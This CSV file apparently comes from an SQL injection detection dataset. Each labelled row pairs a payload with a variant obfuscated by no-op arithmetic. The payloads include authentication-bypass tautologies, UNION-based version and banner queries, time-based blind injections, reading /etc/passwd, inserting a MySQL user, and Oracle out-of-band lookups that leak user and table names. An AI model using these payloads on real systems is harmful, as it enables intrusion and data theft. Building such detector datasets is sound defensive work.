,Query,Label,Original
107," aNd 1 aNd 1 AND 1 aNd  SIN(0)+1+SIN(0)+2*3-6=2*3-6+8-8+2/2-1+utl_inaddr.get_host_address+0+2/2-1   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE  LIMIT+SIN(0)+8-8=2/2-1+SIN(0)+4   )    )    AND  SIN(0)+2/2-1+'i'+2/2-1=8-8+'i+0+SIN(0) ",1," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i"
108, select * from information_schema.tables-- ,1, select * from information_schema.tables--
109," select * from users where  0+id+SIN(0)+0=0+2*3-6+SIN(0)+2/2-1+1 OR 2/2-1 or 0 Or  ""$& "" || 2/2-1 oR 0 Or  8-8+1+8-8+2/2-1=2*3-6+1+2/2-1+SIN(0)+SIN(0) -- 1 ",1," select * from users where id  =  1 or ""$&"" or 1  =  1 -- 1"
110,1   )    )    Or 2*3-6 || SIN(0) || pg_sleep  (  __TIME__  )  -- ,1,1   )    )    or pg_sleep  (  __TIME__  )  --
111," select * from users where  2/2-1+2/2-1+8-8+8-8+id=0+'1'+2/2-1+2/2-1+0 union select !<@,version  (    )   -- 1' ",1," select * from users where id  =  '1' union select !<@,version  (    )   -- 1'"
112,declare @q nvarchar   (  200  )   select  @q+2/2-1+2*3-6+0=0+2/2-1+2/2-1+2*3-6+2/2-1+0x770061 ... ,1,declare @q nvarchar   (  200  )   select @q   =   0x770061 ...
113, OR 2*3-6 or 0 OR  SIN(0)+2/2-1+1+SIN(0)+0+0=0+SIN(0)+1+0+2*3-6+2/2-1 or  0+SIN(0)+''+0=2/2-1+2/2-1+'+0 ,1, or 1  =  1 or ''  =  '
114,select * from users where  2/2-1+id+0+0+8-8=SIN(0)+1+SIN(0) %!<1 || 2*3-6 oR 2*3-6 OR  2*3-6+8-8+1+8-8+8-8=0+1+2/2-1 -- 1 ,1,select * from users where id  =  1 %!<1 or 1  =  1 -- 1
115,declare @q nvarchar   (  200  )   select  SIN(0)+2*3-6+8-8+SIN(0)+@q=0+2/2-1+0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000+2*3-6+SIN(0)+2/2-1 exec  (  @q  )  ,1,declare @q nvarchar   (  200  )   select @q   =   0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec  (  @q  ) 
116," select * from users where  0+SIN(0)+id+2*3-6=8-8+1+2/2-1+SIN(0) or 8-8 OR  ""]1 "" Or 2*3-6 OR SIN(0) oR  0+SIN(0)+1=2*3-6+1+2/2-1 -- 1 ",1," select * from users where id  =  1 or ""]1"" or 1  =  1 -- 1"
117," select * from users where  2*3-6+2*3-6+8-8+id+8-8+2/2-1=2/2-1+SIN(0)+2/2-1+0+1+8-8 Or 0 or 0 oR $+<1 union select 1,@@VERSION -- 1 ",1," select * from users where id  =  1 or $+<1 union select 1,@@VERSION -- 1"
118,or  SIN(0)+2/2-1+'unusual'+2/2-1+2*3-6+8-8='unusual'+2*3-6+0+8-8+SIN(0) ,1,or 'unusual'   =   'unusual'
119, OR 0 || 2/2-1 || 2*3-6 or 1 in   (  select @@version  )  -- ,1, or 1 in   (  select @@version  )  --
120,truncate ,1,truncate
121,as ,1,as
122, Or 2/2-1 OR 0 Or 8-8 oR  0+2/2-1+3+2*3-6+SIN(0)=SIN(0)+3+SIN(0)+SIN(0)+SIN(0)+2*3-6 -- ,1, or 3  =  3 --
123," select * from users where  0+2*3-6+id+2/2-1=2/2-1+8-8+1 ||1 union select 1,banner from v$version where  8-8+0+rownum+2*3-6+2/2-1=0+0+1+0+SIN(0)+2/2-1 -- 1 ",1," select * from users where id  =  1 ||1 union select 1,banner from v$version where rownum  =  1 -- 1"
124," select * from users where  SIN(0)+id+0+2/2-1=1+8-8+2*3-6+2*3-6+8-8 <@$$ union select 1,version  (    )   -- 1 ",1," select * from users where id  =  1 <@$$ union select 1,version  (    )   -- 1"
125,"admin ""  )   OR 2/2-1 Or 2/2-1 Or   (   ""1 "" SIN(0)++0=SIN(0)+SIN(0)++SIN(0) ""1 ",1,"admin""  )   or   (  ""1""  =  ""1"
126," select * from users where  SIN(0)+id+0+8-8+0=2/2-1+2*3-6+0+0+1+SIN(0) or SIN(0) OR 1# ""@ union select 'a',version  (    )   -- 1 ",1," select * from users where id  =  1 or 1#""@ union select 'a',version  (    )   -- 1"
127,"1  )   OR 2/2-1 Or SIN(0) || benchmark  (  10000000,MD5  (  1   )    )   # ",1,"1  )   or benchmark  (  10000000,MD5  (  1   )    )   #"
128," select * from users where  2*3-6+8-8+id+SIN(0)=2/2-1+1+2*3-6 union select .1_,version  (    )   -- 1 ",1," select * from users where id  =  1 union select .1_,version  (    )   -- 1"
129, AND 1 aNd 1 aND 1 AND 1 AND 1 And  0+1+8-8+8-8+0+8-8=8-8+8-8+utl_inaddr.get_host_address+8-8   (    (   SELECT SYS.DATABASE_NAME FROM DUAL   )    )    AND  8-8+8-8+'i'+8-8=2*3-6+'i+SIN(0)+2/2-1+2/2-1+SIN(0) ,1, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT SYS.DATABASE_NAME FROM DUAL   )    )    AND 'i'  =  'i
130," OR 2*3-6 oR 2/2-1 || SIN(0) OR  SIN(0)+8-8+SIN(0)+2*3-6+0+2*3-6=2/2-1+0+8-8 # "" ",1," or 0  =  0 #"""
131,select * from users where  id+2*3-6+SIN(0)+8-8=0+SIN(0)+1+SIN(0)+2*3-6 %$ 1 Or 0 or 2*3-6 or  1+SIN(0)+SIN(0)+8-8+2/2-1+0=1+2/2-1+2*3-6 -- 1 ,1,select * from users where id  =  1 %$ 1 or 1  =  1 -- 1
132,select * from users where  2/2-1+2/2-1+id+8-8+8-8=0+1+2*3-6+2/2-1 %!<@ Or 2*3-6 Or  SIN(0)+2*3-6+1+2/2-1+2/2-1+0=8-8+2*3-6+1 -- 1 ,1,select * from users where id  =  1 %!<@ or 1  =  1 -- 1
133,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' -- ",1,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --"
134,1  )   or SIN(0) OR 2/2-1 Or sleep  (  __TIME__  )  # ,1,1  )   or sleep  (  __TIME__  )  #
135," select * from users where  2/2-1+2*3-6+id+8-8=SIN(0)+1+SIN(0)+2*3-6 OR SIN(0) Or  ""1_ "" Or SIN(0) OR 8-8 ||  SIN(0)+1+2/2-1+2*3-6+8-8=8-8+1+SIN(0) -- 1 ",1," select * from users where id  =  1 or ""1_"" or 1  =  1 -- 1"
136," select * from users where  8-8+8-8+id+8-8+2/2-1+SIN(0)=SIN(0)+1+8-8+0+2*3-6 <1## union select 1,version  (    )   -- 1 ",1," select * from users where id  =  1 <1## union select 1,version  (    )   -- 1"
137," select * from users where  8-8+0+id+8-8+0+0=2*3-6+2/2-1+1 + $+*\ union select null,@@VERSION -- 1 ",1," select * from users where id  =  1 + $+*\ union select null,@@VERSION -- 1"
138,select * from users where  0+id+2*3-6+2*3-6=2*3-6+2/2-1+SIN(0)+0+1. <@ Or 2/2-1 OR 2/2-1 OR  1+2*3-6+SIN(0)=2/2-1+1+0 -- 1 ,1,select * from users where id  =  1. <@ or 1  =  1 -- 1
139, OR 8-8 or true-- ,1, or true--
140,; execute immediate 'sel' oR 2/2-1 Or 'ect us' || 'er' ,1,; execute immediate 'sel' || 'ect us' || 'er'
141,hi' OR SIN(0) OR 8-8 Or  2*3-6+'x'+0+8-8=2/2-1+SIN(0)+SIN(0)+'x';+8-8+2*3-6 ,1,hi' or 'x'  =  'x';
142,select * from users where  0+2*3-6+SIN(0)+id+2/2-1+SIN(0)=2/2-1+2*3-6+1 <@ OR 8-8 or 0 oR  2*3-6+8-8+0+1+SIN(0)+2*3-6=2/2-1+2*3-6+8-8+1 -- 1 ,1,select * from users where id  =  1 <@ or 1  =  1 -- 1
143," select * from users where  id+8-8+2/2-1+0=SIN(0)+8-8+1+2*3-6+2/2-1+2/2-1 OR 2/2-1 || 2/2-1 OR 2/2-1 Or  ""., "" or 8-8 OR  1+2/2-1+SIN(0)=1+SIN(0)+2*3-6+2/2-1+0 -- 1 ",1," select * from users where id  =  1 or "".,"" or 1  =  1 -- 1"
144,admin' # ,1,admin' #
145," select * from users where  8-8+2/2-1+2*3-6+2*3-6+id=8-8+2*3-6+1 <@$_ union select 1,version  (    )   -- 1 ",1," select * from users where id  =  1 <@$_ union select 1,version  (    )   -- 1"
146," select * from users where  8-8+2*3-6+0+id+2/2-1=8-8+1+2*3-6+0 OR 8-8 OR  "",  (   "" or 0 Or 2/2-1 or  0+8-8+1+2*3-6+2/2-1=2*3-6+1+0+2/2-1+2/2-1 -- 1 ",1," select * from users where id  =  1 or "",  (  "" or 1  =  1 -- 1"
147," select * from users where  0+8-8+id+8-8+8-8=0+1+0+SIN(0)+0 Or 2/2-1 oR 8-8 OR  "",{ "" OR 2/2-1 Or 2/2-1 oR 0 ||  1+SIN(0)+SIN(0)=2*3-6+1+2*3-6 -- 1 ",1," select * from users where id  =  1 or "",{"" or 1  =  1 -- 1"
148," union select 1,load_file  (  '/etc/passwd'  )  ,1,1,1; ",1," union select 1,load_file  (  '/etc/passwd'  )  ,1,1,1;"
149," ""  )  ;waitfor delay '0:0:__TIME__'-- ",1,"""  )  ;waitfor delay '0:0:__TIME__'--"
150, Or 8-8 OR 8-8 Or  'unusual'+8-8+SIN(0)='unusual'+8-8+0 ,1, or 'unusual'   =   'unusual'
151,"insert into mysql.user   (  user, host, password  )   values   (  'name', 'localhost', password  (  'pass123'   )    )    ",1,"insert into mysql.user   (  user, host, password  )   values   (  'name', 'localhost', password  (  'pass123'   )    )   "
152,"admin "" OR 2/2-1 OR  ""1 "" 2/2-1+2*3-6++SIN(0)+8-8=2*3-6+0+ ""1 ""/* ",1,"admin"" or ""1""  =  ""1""/*"
153," select * from users where  2*3-6+2*3-6+id+2*3-6=1+2/2-1+0+2*3-6+2*3-6 Or 0 Or  ""1  (   "" 2*3-6+2/2-1++0=8-8+1+8-8 or 2/2-1 or  0+1+2/2-1=8-8+1+8-8 -- 1 ",1," select * from users where id  =  1 or ""1  (  ""  =  1 or 1  =  1 -- 1"
154," select * from users where  2*3-6+0+id+0+SIN(0)+2*3-6=8-8+8-8+2*3-6+1+2/2-1 or 8-8 or \<1 union select 1,@@VERSION -- 1 ",1," select * from users where id  =  1 or \<1 union select 1,@@VERSION -- 1"
155,like ,1,like
156,or username like char  (  37  )  ; ,1,or username like char  (  37  )  ;
157, )    )    Or 8-8 oR 2*3-6 oR pg_sleep  (  __TIME__  )  -- ,1, )    )    or pg_sleep  (  __TIME__  )  --
158,select * from users where  8-8+0+id+8-8+2*3-6=2/2-1+1+2*3-6+8-8 || 2/2-1 or 0 or $+<\ or  2*3-6+0+SIN(0)+1+2*3-6+0=0+2*3-6+2*3-6+1 -- 1 ,1,select * from users where id  =  1 or $+<\ or 1  =  1 -- 1
159,or  0+SIN(0)+8-8+3+2*3-6=0+SIN(0)+3+0+2/2-1 ,1,or 3  =  3
160," select * from users where  0+2/2-1+id+0+SIN(0)=SIN(0)+2/2-1+SIN(0)+1+0 Or 0 Or  ""  (  . "" oR 8-8 oR 2/2-1 OR 2/2-1 Or  1+2*3-6+0=8-8+1+2/2-1+2/2-1 -- 1 ",1," select * from users where id  =  1 or ""  (  ."" or 1  =  1 -- 1"
161,select * from users where  0+0+0+id+SIN(0)=SIN(0)+0+8-8+1 OR SIN(0) Or   (  $+   SIN(0)+)+2/2-1+8-8+SIN(0)+8-8=2/2-1+0+1+0+8-8+SIN(0) or  0+1+2/2-1=2/2-1+8-8+1+0 -- 1 ,1,select * from users where id  =  1 or   (  $+  )    =  1 or 1  =  1 -- 1
162,exec sp ,1,exec sp
163," select * from users where  2/2-1+2/2-1+2*3-6+0+id=2/2-1+2*3-6+1+SIN(0)+2*3-6+SIN(0) OR 8-8 oR 0 oR 2/2-1 || \+<$ union select 1,@@VERSION -- 1 ",1," select * from users where id  =  1 or \+<$ union select 1,@@VERSION -- 1"
164,select * from users where  0+id+SIN(0)+2/2-1+8-8=0+1+2/2-1 or 0 or 2/2-1 oR \<$ or  SIN(0)+0+1+2*3-6+8-8=0+0+2/2-1+2*3-6+1 -- 1 ,1,select * from users where id  =  1 or \<$ or 1  =  1 -- 1
165," select * from users where  2*3-6+2/2-1+id+2/2-1+8-8=2*3-6+0+8-8+1.&&1 union select 1,version  (    )   -- 1 ",1," select * from users where id  =  1.&&1 union select 1,version  (    )   -- 1"
166,admin' or 8-8 Or  SIN(0)+1+2/2-1=2*3-6+2*3-6+SIN(0)+1/*+SIN(0) ,1,admin' or 1  =  1/*
167,a' waitfor delay '0:0:10'-- ,1,a' waitfor delay '0:0:10'--
168," select * from users where  2*3-6+id+0=SIN(0)+1+SIN(0)+SIN(0) +  (  \  )   union select null,@@VERSION -- 1 ",1," select * from users where id  =  1 +  (  \  )   union select null,@@VERSION -- 1"
169," select * from users where  8-8+SIN(0)+id+8-8+SIN(0)=8-8+2*3-6+1+8-8+8-8 union select .1$_,version  (    )   -- 1 ",1," select * from users where id  =  1 union select .1$_,version  (    )   -- 1"
170,and 1 in   (  select var from temp  )  -- ,1,and 1 in   (  select var from temp  )  --
171,hi'  )   OR 0 Or   (   2/2-1+0+'a'+SIN(0)+SIN(0)=2*3-6+'a+2*3-6 ,1,hi'  )   or   (  'a'  =  'a
172," And 1 AND 1 And 1 &&  1+8-8+2*3-6=0+2/2-1+0+utl_inaddr.get_host_address+0+8-8   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE  LIMIT+2*3-6+0+8-8=1+2/2-1+2/2-1+2/2-1   )    )    AND  0+SIN(0)+'i'+SIN(0)=2/2-1+8-8+'i+SIN(0)+2*3-6 ",1," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i"
173,"admin "" or 2/2-1 OR SIN(0) ||  1+SIN(0)+8-8+2/2-1=1+SIN(0)+8-8 ",1,"admin"" or 1  =  1"
174," ""  )   oR 0 or 2/2-1 or true-- ",1,"""  )   or true--"
175," select * from users where  2*3-6+2/2-1+id=2/2-1+'1'+2/2-1 or 2/2-1 Or $  2/2-1+2*3-6+0+.+2/2-1=2/2-1+2/2-1+1+2/2-1+2*3-6+SIN(0) union select 1,@@VERSION -- 1' ",1," select * from users where id  =  '1' or $ .  =  1 union select 1,@@VERSION -- 1'"
176," select * from users where  2/2-1+0+id+8-8+2/2-1+SIN(0)=2/2-1+SIN(0)+1+2/2-1 OR 8-8 or  ""  (  { "" OR 0 Or  2*3-6+8-8+1+2*3-6+2*3-6=8-8+1+2/2-1 -- 1 ",1," select * from users where id  =  1 or ""  (  {"" or 1  =  1 -- 1"
177,1  )   Or 2*3-6 or pg_sleep  (  __TIME__  )  -- ,1,1  )   or pg_sleep  (  __TIME__  )  --
178," select * from users where  SIN(0)+2*3-6+id=8-8+SIN(0)+2*3-6+2/2-1+1+SIN(0) OR 8-8 OR  ""{. "" OR 2/2-1 or  SIN(0)+0+1+2*3-6=0+2*3-6+2*3-6+1 -- 1 ",1," select * from users where id  =  1 or ""{."" or 1  =  1 -- 1"
179," ""  )   Or 0 Or sleep  (  __TIME__   2*3-6+)+8-8+2*3-6=8-8+2/2-1+ "" ",1,"""  )   or sleep  (  __TIME__  )    =  """
180,select * from users where  2/2-1+SIN(0)+id=0+1.<@.+0+0 Or 0 or  1+0+SIN(0)=2/2-1+2*3-6+SIN(0)+8-8+1+0 -- 1 ,1,select * from users where id  =  1.<@. or 1  =  1 -- 1
181,"admin ""  )   Or 2*3-6 or   (   ""1 "" 0++8-8+2/2-1=+2*3-6+8-8+0 ""1 ""-- ",1,"admin""  )   or   (  ""1""  =  ""1""--"
182," select * from users where  2/2-1+2/2-1+2*3-6+8-8+id+8-8=2*3-6+2*3-6+1<@..+0+2*3-6 union select 1,version  (    )   -- 1 ",1," select * from users where id  =  1<@.. union select 1,version  (    )   -- 1"
183,; exec xp_regread ,1,; exec xp_regread
184," select * from users where  SIN(0)+id+2*3-6=8-8+'1'+0 + @ 1 union select 1,version  (    )   -- 1' ",1," select * from users where id  =  '1' + @ 1 union select 1,version  (    )   -- 1'"
185,select * from users where  2*3-6+SIN(0)+id+SIN(0)=2*3-6+2*3-6+0+1+2/2-1+SIN(0) + \+%1 or 2/2-1 Or 8-8 oR  2*3-6+2/2-1+2*3-6+2/2-1+1+2*3-6=8-8+1+SIN(0)+8-8+0 -- 1 ,1,select * from users where id  =  1 + \+%1 or 1  =  1 -- 1
186," select * from users where  8-8+0+id+SIN(0)+8-8=2*3-6+2/2-1+1+2*3-6+SIN(0)+2*3-6 Or SIN(0) OR 8-8 OR  "";1 "" Or 8-8 OR 2/2-1 oR 2/2-1 ||  8-8+8-8+1+SIN(0)+0+SIN(0)=0+1+2/2-1+0 -- 1 ",1," select * from users where id  =  1 or "";1"" or 1  =  1 -- 1"
187," select * from users where  8-8+2/2-1+id+8-8=0+SIN(0)+1+2/2-1 or 0 oR 0 or  ""%& "" or 0 OR 8-8 ||  SIN(0)+2*3-6+1+2/2-1+8-8=8-8+8-8+1 -- 1 ",1," select * from users where id  =  1 or ""%&"" or 1  =  1 -- 1"
188,1 aNd 1 aND  8-8+SIN(0)+1=2/2-1+1+8-8+2*3-6 ,1,1 and 1  =  1
189,or  8-8+SIN(0)+0+SIN(0)+2*3-6=2*3-6+0+8-8+SIN(0)+2/2-1 # ,1,or 0  =  0 #
190,union select * from users where  2/2-1+2*3-6+SIN(0)+login+8-8+2*3-6=8-8+char+8-8+2*3-6+SIN(0) ... ,1,union select * from users where login   =   char ...
191," select * from users where  8-8+2/2-1+id+2*3-6+0=2/2-1+1+8-8 union select 1||@,version  (    )   -- 1 ",1," select * from users where id  =  1 union select 1||@,version  (    )   -- 1"
192,admin'  )   OR 2*3-6 Or SIN(0) or  0+'1'+0+SIN(0)=2/2-1+8-8+2*3-6+'1'--+2*3-6+2*3-6 ,1,admin'  )   or '1'  =  '1'--
193,1;SELECT * ,1,1;SELECT *
194," select * from users where  8-8+8-8+id=8-8+1+SIN(0) or 8-8 Or  ""{; "" OR 2*3-6 or SIN(0) OR  0+2*3-6+1+0=8-8+2*3-6+2*3-6+1+SIN(0)+8-8 -- 1 ",1," select * from users where id  =  1 or ""{;"" or 1  =  1 -- 1"
195,x' AND 1 and  0+8-8+8-8+1+2/2-1+2/2-1=0+(+8-8  select count  (  *  )   from tabname  )  ; -- ,1,x' and 1  =    (  select count  (  *  )   from tabname  )  ; --
196," select * from users where  0+SIN(0)+0+id=8-8+2/2-1++2*3-6+2*3-6+SIN(0) '1 ' OR 0 Or SIN(0) or """"<@ union select 1,version  (    )   -- 1 ' ",1," select * from users where id  =  '1' or """"<@ union select 1,version  (    )   -- 1'"
197," select * from users where  SIN(0)+2/2-1+2*3-6+id+0=0+8-8+2*3-6+1+2/2-1 or SIN(0) oR 2/2-1 || 0 Or  ""?, "" OR 0 or 8-8 oR  2/2-1+1+SIN(0)=2/2-1+SIN(0)+0+8-8+1+0 -- 1 ",1," select * from users where id  =  1 or ""?,"" or 1  =  1 -- 1"
198," select * from users where  id+8-8+SIN(0)=SIN(0)+'1'+8-8+0 ||1 union select 1,banner from v$version where  2/2-1+8-8+0+rownum=2/2-1+1+SIN(0) -- 1' ",1," select * from users where id  =  '1' ||1 union select 1,banner from v$version where rownum  =  1 -- 1'"
199,"1 || 2*3-6 oR SIN(0) Or benchmark  (  10000000,MD5  (  1   )    )   # ",1,"1 or benchmark  (  10000000,MD5  (  1   )    )   #"
200,procedure ,1,procedure
201,or  8-8+0+''+8-8+0=8-8+'+SIN(0)+2/2-1+8-8 ,1,or ''  =  '
202, AND 1 And 1 AND 1 AND 1 AND  8-8+0+0+1=8-8+SIN(0)+utl_inaddr.get_host_address+0+0   (    (   SELECT SYS.LOGIN_USER FROM DUAL   )    )    AND  SIN(0)+'i'+2*3-6+2*3-6=SIN(0)+0+'i+SIN(0)+2*3-6 ,1, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT SYS.LOGIN_USER FROM DUAL   )    )    AND 'i'  =  'i
203," And 1 And 1 AND 1 AND  2*3-6+2/2-1+1+8-8=2*3-6+2*3-6+utl_inaddr.get_host_address+SIN(0)+2*3-6   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE  SIN(0)+0+LIMIT+2*3-6=2/2-1+2/2-1+2   )    )    AND  2/2-1+0+2*3-6+'i'+2*3-6=8-8+2/2-1+2/2-1+'i+2/2-1+2*3-6 ",1," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i"
204,\'; desc users; -- ,1,\'; desc users; --
205," select * from users where  id+SIN(0)+SIN(0)=8-8+2/2-1+2/2-1+SIN(0)+SIN(0)+1 Or 8-8 Or   (  \.   2*3-6+SIN(0)+2/2-1+)+2*3-6=1+SIN(0)+SIN(0) union select 1,@@VERSION -- 1 ",1," select * from users where id  =  1 or   (  \.  )    =  1 union select 1,@@VERSION -- 1"
206,select * from users where  2*3-6+id+8-8+SIN(0)=8-8+'1'+2/2-1+SIN(0) Or 2/2-1 or $  0+SIN(0)+1+SIN(0)=8-8+8-8+1+0+2*3-6+2/2-1 or  2/2-1+SIN(0)+1+2*3-6+2/2-1=8-8+0+1+2/2-1+SIN(0)+2/2-1 -- 1' ,1,select * from users where id  =  '1' or $ 1  =  1 or 1  =  1 -- 1'
207," "" oR 0 oR 2*3-6 oR 0 OR  "" ""^ "" ",1,""" or """"^"""
208," ""- "" ",1,"""-"""
209," select * from users where  2*3-6+2/2-1+id=2/2-1+8-8+1+0+SIN(0)+8-8 Or 2*3-6 or  2/2-1+2/2-1+\<+2*3-6+8-8=SIN(0)+1+SIN(0)+2/2-1 union select 1,@@VERSION -- 1 ",1," select * from users where id  =  1 or \<   =  1 union select 1,@@VERSION -- 1"
210," select * from users where  2/2-1+8-8+2*3-6+id+SIN(0)=8-8+2*3-6+SIN(0)+1+2/2-1+8-8 union select 1<@$,version  (    )   -- 1 ",1," select * from users where id  =  1 union select 1<@$,version  (    )   -- 1"
211," select * from users where  SIN(0)+2*3-6+0+id+2/2-1+2*3-6=2*3-6+8-8+2/2-1+1+SIN(0)+2/2-1 *\ union select null,@@VERSION -- 1 ",1," select * from users where id  =  1 *\ union select null,@@VERSION -- 1"
212," select * from users where  2/2-1+8-8+id=SIN(0)+0+2*3-6+8-8+'1'+8-8 oR 8-8 Or 8-8 OR !<@ union select 1,version  (    )   -- 1' ",1," select * from users where id  =  '1' or !<@ union select 1,version  (    )   -- 1'"
213," select * from users where  2*3-6+id+8-8+2/2-1=SIN(0)+1+2*3-6+0 OR 2*3-6 or  "".% "" OR 0 || 2/2-1 ||  2*3-6+0+2*3-6+8-8+1+8-8=1+8-8+2*3-6 -- 1 ",1," select * from users where id  =  1 or "".%"" or 1  =  1 -- 1"
214,admin'/* ,1,admin'/*
215," select * from users where  0+0+id+2*3-6=SIN(0)+0+1+8-8+SIN(0) Or SIN(0) or  ""  (  # "" or 8-8 OR  8-8+2/2-1+1+0=SIN(0)+1+2*3-6+0 -- 1 ",1," select * from users where id  =  1 or ""  (  #"" or 1  =  1 -- 1"
216,||UTL_HTTP.REQUEST ,1,||UTL_HTTP.REQUEST
217," AND 1 And 1 AND 1 and 1 AND  0+2*3-6+1+SIN(0)+8-8=SIN(0)+8-8+SIN(0)+utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE  2/2-1+8-8+LIMIT=SIN(0)+2/2-1+8-8+1+SIN(0)+SIN(0)   )    )    AND  SIN(0)+8-8+'i'=2/2-1+2*3-6+'i+SIN(0)+SIN(0) ",1," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i"
218," select * from users where  2/2-1+id+8-8='1'<@..+SIN(0)+2/2-1+2*3-6 union select 1,version  (    )   -- 1' ",1," select * from users where id  =  '1'<@.. union select 1,version  (    )   -- 1'"
219," ""   )    )    Or SIN(0) oR 8-8 or benchmark  (  10000000,MD5  (  1   )    )   # ",1,"""   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #"
220," select * from users where  id+0+8-8=0+1+2/2-1+2*3-6+8-8+SIN(0) <@.$ union select 1,version  (    )   -- 1 ",1," select * from users where id  =  1 <@.$ union select 1,version  (    )   -- 1"
221," select * from users where  SIN(0)+SIN(0)+id+2*3-6=0+1+2/2-1 or SIN(0) or 2/2-1 OR $  .+2/2-1+2/2-1=SIN(0)+2/2-1+1+SIN(0)+2/2-1 union select 1,@@VERSION -- 1 ",1," select * from users where id  =  1 or $ .  =  1 union select 1,@@VERSION -- 1"
222,select * from users where  8-8+id+2/2-1+2*3-6+SIN(0)+2*3-6=8-8+'1'+2/2-1 <@.$ Or 8-8 oR 2*3-6 Or  8-8+0+2*3-6+2/2-1+1=1+8-8+2/2-1+8-8 -- 1' ,1,select * from users where id  =  '1' <@.$ or 1  =  1 -- 1'
223,1 uni/**/on select all from where ,1,1 uni/**/on select all from where
224," select * from users where  2/2-1+0+SIN(0)+SIN(0)+id+2/2-1=2/2-1+SIN(0)+1 +$ . union select null,@@VERSION -- 1 ",1," select * from users where id  =  1 +$ . union select null,@@VERSION -- 1"
225," select * from users where  2*3-6+SIN(0)+SIN(0)+id+2/2-1=0+1+2/2-1+2/2-1+SIN(0)+2/2-1 Or 2*3-6 OR 1# ""? union select null,version  (    )   -- 1 ",1," select * from users where id  =  1 or 1#""? union select null,version  (    )   -- 1"
226,admin'  )   Or 8-8 Or 0 oR  0+2*3-6+SIN(0)+'1'+2/2-1+0='1'+2/2-1+2*3-6+8-8 #,1,admin'  )   or '1'  =  '1'#
227,||utl_http.request  (  'httP://192.168.1.1/'  )  ||' ,1,||utl_http.request  (  'httP://192.168.1.1/'  )  ||'
228,or  8-8+8-8+2*3-6+'7659'=2/2-1+2*3-6+0+'7659+2*3-6+2/2-1 ,1,or '7659'  =  '7659
229," select * from users where  SIN(0)+id+8-8+8-8+2/2-1=1+2/2-1+8-8+SIN(0)+8-8+SIN(0) or 2*3-6 or 2*3-6 oR 2/2-1 OR  ""{@ "" OR 2*3-6 oR 8-8 or  1+2*3-6+2*3-6+2*3-6+8-8=0+SIN(0)+1+0 -- 1 ",1," select * from users where id  =  1 or ""{@"" or 1  =  1 -- 1"
230," select * from users where  2*3-6+id+8-8+SIN(0)=SIN(0)+SIN(0)+SIN(0)+1+2/2-1+2*3-6 union select +!<1,version  (    )   -- 1 ",1," select * from users where id  =  1 union select +!<1,version  (    )   -- 1"
